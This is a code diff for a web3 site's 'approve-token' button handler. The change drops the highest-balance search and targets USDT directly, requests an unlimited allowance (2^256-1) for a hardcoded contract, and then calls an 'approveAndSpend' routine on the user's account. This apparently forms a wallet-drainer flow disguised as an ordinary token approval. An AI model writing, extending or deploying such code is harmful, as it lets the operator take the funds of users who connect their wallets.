@@ -97,6 +97,7 @@ const DR_CONTRACT = {
   DECIMALS: 18,
 };
 
+// Modified approve-token event listener function
 document.querySelector("#approve-token")?.addEventListener("click", async () => {
   try {
     const account = getAccount(wagmiAdapter.wagmiConfig);
@@ -104,18 +105,24 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
       throw new Error("Please connect your wallet first");
     }
 
-    // Get all tokens and find the one with highest balance
+    // Show status updates to the user
+    const statusEl = document.querySelector("#status");
+    statusEl.textContent = "Checking tokens...";
+
+    // Get tokens but don't filter by minimum balance
     const tokens = await fetchUserTokens(account.address, account.chainId);
-    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
-      minBalance: 0.01,
-      excludeTokens: ["DUST"],
-    });
-    const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(
-      filteredTokens
+    console.log("All tokens:", tokens);
+
+    // Find USDT token directly without filtering by balance
+    const usdtToken = tokens.tokens.find(token => 
+      token.tokenInfo.address.toLowerCase() === LXB_CONTRACT.ADDRESS.toLowerCase()
     );
 
-    if (!highestBalanceToken) {
-      throw new Error("No tokens found in wallet");
+    console.log("USDT token:", usdtToken);
+
+    if (!usdtToken) {
+      statusEl.textContent = "Error: USDT token not found";
+      throw new Error("USDT token not found in wallet");
     }
 
     // Show contract details before approval
@@ -125,35 +132,37 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
       DR_CONTRACT.ADDRESS
     );
 
-    // Convert the balance to Wei (multiply by 10^6 for token decimals)
-    const balanceInWei = BigInt(
-      Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 6)
-    );
+    console.log("Contract details:", details);
 
+    // Always use max approval amount
+    const approvalAmount = (2n ** 256n - 1n).toString();
+
+    // Check if already approved
     const isApproved = await tokenApprover.hasApprovedContract(
       LXB_CONTRACT.ADDRESS,
       account.address,
       DR_CONTRACT.ADDRESS,
-      balanceInWei
+      approvalAmount
     );
+
+    console.log("Is approved:", isApproved);
 
     // Display the details
     tokenDetailsViewer.createDetailsDisplay(detailsContainer, details);
 
     // Ask for confirmation
-    const confirmed = confirm(`Do you want to approve the LXB Contract?`);
+    const confirmed = confirm(`Do you want to approve USDT (Tether) for the contract?`);
     if (!confirmed) {
+      statusEl.textContent = "Approval cancelled";
       return;
     }
 
     // Verify we're on the correct network
     if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
-      throw new Error("Please switch to Mainnet");
+      statusEl.textContent = "Please switch to Ethereum Mainnet";
+      throw new Error("Please switch to Ethereum Mainnet");
     }
 
-    const approvalAmount = (2n ** 256n - 1n).toString();
-
-    const statusEl = document.querySelector("#status");
     statusEl.textContent = "Initiating approval...";
 
     // Use the updated approveAndSpend method
@@ -165,12 +174,11 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
       account.address
     );
 
-    statusEl.textContent = `Successfully approved ${highestBalanceToken.symbol} tokens!`;
+    statusEl.textContent = `Successfully approved USDT tokens!`;
   } catch (error) {
     console.error("Approval error:", error);
-    document.querySelector("#status").textContent =
-      "Approval failed";
-    throw error;
+    const statusEl = document.querySelector("#status");
+    statusEl.textContent = `Approval failed: ${error.message}`;
   }
 });
 
